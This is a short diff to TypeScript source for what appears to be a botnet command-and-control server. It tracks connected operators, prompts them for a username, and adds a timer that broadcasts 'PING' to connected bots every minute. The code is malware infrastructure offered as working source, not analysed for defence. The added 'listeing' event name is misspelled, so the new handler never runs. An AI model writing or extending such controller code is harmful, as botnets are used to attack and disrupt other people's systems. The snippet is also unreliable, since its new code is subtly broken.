@@ -97,17 +97,22 @@ function create_and_bind(port : number) {
         }
       })
   }).listen(port);
+  
+  botserver.on("listeing", () => {
+    setInterval(() => broadcast("PING\n"), 60000);
+  });
 }
 
 function BotWorker(port: number) {
   cncserver = net.createServer(async function (socket) { // Connection
-    let twint;
+    let twint; // title writer int (id)
     OperatorsConnected++;
-    socket.on('error', (e) => {
+
+    socket.on('error', (e) => { // Handle errors (eg disconnects)
       if(twint) clearInterval(twint);
       OperatorsConnected--;
       console.error(e);
-    }); // Handle errors (eg disconnects)
+    });
 
     let username = await new Promise((res) => {
       socket.write('\x1b[37mUsername: \x1b[30m ' )
